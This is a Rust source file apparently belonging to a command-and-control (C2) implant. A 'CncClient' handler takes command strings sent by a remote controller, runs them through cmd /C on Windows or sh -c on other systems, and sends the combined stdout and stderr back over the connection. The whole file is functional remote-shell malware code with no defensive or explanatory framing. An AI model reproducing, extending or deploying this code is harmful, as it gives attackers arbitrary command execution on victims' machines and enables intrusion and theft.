use std::process::{Output, Command};

use super::CncClient;

use libvoid::{enums::Protocol, errors::{ProtocolError, ProtocolResult}};

impl CncClient {
    pub fn handle(&mut self) -> ProtocolResult<()> {

        let command = Protocol::try_from(self.readbuf[0])?;
        
        self.readbuf.drain(0..1);
        match command {
            Protocol::RequestCmd => self.do_run_command()?,
            _ => (),
        };
        self.readbuf.clear();
        Ok(())
    }

    pub fn do_run_command(&mut self) -> ProtocolResult<()> {

        let input = String::from_utf8_lossy(&self.readbuf[..]);
    
        let mut output: Output = if cfg!(target_os = "windows") {
            match Command::new("cmd")
            .args(["/C", input.as_ref()])
            .output() {
                Ok(out) => out,
                Err(_) => return Err(ProtocolError::Command(format!("Unable to run command `{}'", input))),
            }
        } else {
            match Command::new("sh")
            .arg("-c")
            .arg(input.as_ref())
            .output() {
                Ok(out) => out,
                Err(_) => return Err(ProtocolError::Command(format!("Unable to run command `{}'", input))),
            }
        };
    
        let mut buf = output.stdout;
        buf.append(&mut output.stderr);
        let s = String::from_utf8_lossy(&buf);
    
        let mut tosend = Vec::<u8>::new();
        tosend.push(Protocol::ReturnCmd.value());
        tosend.append(&mut s.as_bytes().to_vec());
    
        self.write(&tosend);
        Ok(())
    }
}